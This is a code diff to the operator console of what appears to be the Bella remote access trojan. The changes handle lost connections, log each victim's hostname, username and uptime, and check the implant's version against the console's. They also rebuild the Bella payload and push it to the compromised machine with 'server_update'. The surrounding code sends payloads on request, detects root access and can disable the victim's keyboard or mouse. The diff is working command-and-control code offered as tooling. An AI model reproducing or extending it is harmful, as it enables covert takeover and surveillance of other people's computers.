@@ -144,7 +144,7 @@ def main():
     ctrlC = False
     active=False
     first_run = True
-    cc_version = '1.22'
+    cc_version = '1.35'
     logpath = 'Logs/'
     helperpath = os.getcwd() + '/'
     client_log_path = ''
@@ -288,7 +288,13 @@ def main():
                         data = ''.join((next_msg_is_fxn_data[1], data))
                         next_msg_is_fxn_data = (False, '')
                     else:
-                        (data, isFinished) = recv_msg(connections[activate], False) 
+                        try:
+                            (data, isFinished) = recv_msg(connections[activate], False)
+                        except TypeError as e:
+                            if "'NoneType' object is not iterable" in e.message:
+                                print '%s%sLost connection%s' % (red, bold, endC)
+                                exit()
+                            raise e
                         if not isFinished:
                             if data in fxn_headers: #chat_history
                                 next_msg_is_fxn_data = (True, data) #function too :D
@@ -304,7 +310,7 @@ def main():
                     active=False
                     print "\n%s%sLost connection to server.%s" % (red, bold, endC)
                     
-                if first_run == True:
+                if first_run:
                     is_server_rooted = False
                     if data == 'payload_request_SBJ129':
                         print 'Payloads requested. Sending payloads...'
@@ -323,11 +329,30 @@ def main():
                         workingdir = basicInfo[2] #cwd via pwd
                         last_login = basicInfo[3] #last login read via DB
                         uptime = basicInfo[4] #bella uptime
+                        print 'Last Connected: %s -- %s' % (last_login, uptime)
+
+                        version = basicInfo[-1] #really basicInfo[5], but wont throw error if Bella <1.32
+                        if version == uptime: #handling for Bella < 1.32
+                            print '%sThis server is running an old version of Bella.' % redX
+                        else: #we got version
+                            try:
+                                version = float(version)
+                                if version < float(cc_version):
+                                    print '%sRemote server is running an old version of Bella.' % redX
+                                    print "%sRun 'server_update' to update." % yellow_star
+                                elif version > float(cc_version):
+                                    print '%sThis Control Center is older than the server.' % redX
+                                    print '%sUpdate Control Center through git.' % yellow_star
+                                else:
+                                    pass #uncomment below if you would like.
+                                    #print '%sServer and CC are same version.' % yellow_star
+                            except ValueError:
+                                print 'Error getting remote Bella version.'
+                            
                         client_log_path = "%s%s/%s/" % (logpath, computername, client_name)
                         if not os.path.exists(client_log_path):
                             os.makedirs(client_log_path)
                         first_run = False
-                        print 'Last Connected: %s -- %s' % (last_login, uptime)
                     else:
                         computername = data.splitlines()[1] #hostname via scutil
                         client_name = data.splitlines()[2] #username via whoami
@@ -633,24 +658,26 @@ def main():
                             nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
                         else:
                             nextcmd = "set_client_name:::%s" % nextcmd.replace('set_client_name ', '')
-                        
+
                     if nextcmd == "server_update":
-                        if nextcmd == "server_update": #no stdin
-                            local_file= raw_input("📡  Enter full path to new server on local machine: ")
-                        else:
-                            local_file = nextcmd[14:] #take path as stdin
-                        local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
-                        if os.path.isfile(local_file):
-                            with open(local_file, 'rb') as content:
-                                new_server = content.read()
-                            if not "verify_update_id = '2f4e2e37c9b6eecebb0927a96938b4fa'" in new_server:
-                                print 'This does not appear to be a Bella payload. Cancelling update.'
-                                nextcmd = ''
-                            else:
-                                nextcmd = "host_update%s" % pickle.dumps(new_server)
-                        else:
-                            print "Could not find [%s]!" % local_file
+                        print '%sBuilding new Bella payload...' % bluePlus
+                        builder = subprocess.Popen('./BUILDER Bella.py', shell=True)
+                        if builder.wait() != 0: #it failed
+                            print '%sThere was an error building the new Bella payload.' % redX
                             nextcmd = ''
+                        else:
+                            build_loc = 'Builds/%s/Bella' % os.listdir('Builds')[-1]
+                            confirm = raw_input('%sConfirm update with this build (y/n): ' % yellow_star)
+                            if confirm.lower() == 'y':
+                                print '%sUploading code.' % greenCheck
+                                with open(build_loc, 'rb') as content:
+                                    new_server = content.read()
+                                with open('Payloads/payloads.txt', 'rb') as content:
+                                    payloads = content.read() #read payloads
+                                nextcmd = "host_update%s" % pickle.dumps(new_server)
+                            else:
+                                print '%sCancelling update' % redX
+                                nextcmd = ''
 
                     if nextcmd == "disableKM":
                         print "[1] Keyboard | [2] Mouse"
